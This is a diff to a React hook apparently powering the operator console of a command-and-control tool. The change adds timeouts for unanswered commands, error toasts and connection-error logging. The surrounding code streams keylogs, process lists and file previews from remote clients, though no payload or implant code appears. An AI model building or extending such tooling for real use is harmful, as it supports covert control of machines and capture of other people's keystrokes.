@@ -66,10 +66,17 @@ export function useC2Polling(opts: UseC2PollingOpts) {
     if (id > lastLogIdRef.current) lastLogIdRef.current = id;
   }, []);
 
+  // Track PENDING logs that never get a SUCCESS — used for timeout error state
+  const pendingTimeoutsRef = useRef<Map<number, ReturnType<typeof setTimeout>>>(new Map());
   // Single processing path shared by the polling fetch and SSE pushes
   const processLog = useCallback((log: CommandLog) => {
     if (printedIdsRef.current.has(log.id)) return;
     noteLogId(log.id);
+    // If this PENDING eventually gets a SUCCESS, clear its timeout
+    if (pendingTimeoutsRef.current.has(log.id)) {
+      clearTimeout(pendingTimeoutsRef.current.get(log.id)!);
+      pendingTimeoutsRef.current.delete(log.id);
+    }
     // Only accept structured output from the currently targeted client —
     // another machine's ls/ps/preview must never hijack this operator's view
     const fromTarget = !targetRef.current || log.client_id === targetRef.current;
@@ -129,7 +136,27 @@ export function useC2Polling(opts: UseC2PollingOpts) {
     } else if (log.status === 'SUCCESS' && log.output && !log.output.startsWith('Queued')) {
       trackId(log.id);
       const cmdLabel = log.command || 'Command';
-      appendTermLog([`\n[${cmdLabel}] ${log.client_id}`, log.output]);
+      const isError = log.output.trim().startsWith('[-]') || log.output.includes('Failed') || log.output.includes('Error:');
+      appendTermLog([`\n[${cmdLabel}] ${log.client_id}${isError ? ' — FAILED' : ''}`, log.output]);
+      if (isError) showToast(`${cmdLabel} failed on ${log.client_id}`);
+    } else if (log.status === 'PENDING' && log.output.startsWith('Queued')) {
+      // Don't print PENDING noise — but arm a timeout. If no SUCCESS for this id in 30s,
+      // the client is likely offline/slow and operator needs feedback + retry.
+      trackId(log.id);
+      if (pendingTimeoutsRef.current.has(log.id)) return;
+      const tid = setTimeout(() => {
+        pendingTimeoutsRef.current.delete(log.id);
+        // Only fire if this log is still pending (no SUCCESS seen)
+        if (printedIdsRef.current.has(log.id)) return;
+        const fromTargetNow = !targetRef.current || log.client_id === targetRef.current;
+        if (!fromTargetNow) return;
+        appendTermLog([
+          `\n[${log.command}] ${log.client_id} — NO RESPONSE (30s)`,
+          `[-] No result — client may be offline, sleeping, or rate-limited. Retry with: ${log.command}`,
+        ]);
+        showToast(`No response from ${log.client_id} — retry?`);
+      }, 30000);
+      pendingTimeoutsRef.current.set(log.id, tid);
     }
   }, [noteLogId, trackId, setPreviewData, setIsPreviewLoading, setPreviewOpen, setAppsList, setIsAppsLoading, mergeAppIcons, setProcessList, setIsProcessesLoading, parseFileList, appendTermLog, appendKeylogChunk, setIsKeylogStreaming]);
 
@@ -173,6 +200,7 @@ export function useC2Polling(opts: UseC2PollingOpts) {
               setC2ConnectionStatus('error');
               if (!hadErrorRef.current) showToast(`Connection failed: ${e}`);
               hadErrorRef.current = true;
+              appendTermLog([`[-] C2 unreachable — retrying… (${e?.message || e})`]);
             }
           }
           try {
@@ -183,7 +211,14 @@ export function useC2Polling(opts: UseC2PollingOpts) {
           try {
             backendClients = await invoke<Client[]>('get_clients');
             backendLogs = await invoke<CommandLog[]>('get_logs');
-          } catch {}
+            setC2ConnectionStatus(backendClients.length ? 'connected' : 'connected');
+            hadErrorRef.current = false;
+          } catch (e: any) {
+            setC2ConnectionStatus('error');
+            if (!hadErrorRef.current) showToast(`Local C2 error: ${e}`);
+            hadErrorRef.current = true;
+            appendTermLog([`[-] Local C2 error — is Tauri sidecar running? (${e})`]);
+          }
         }
 
         try {
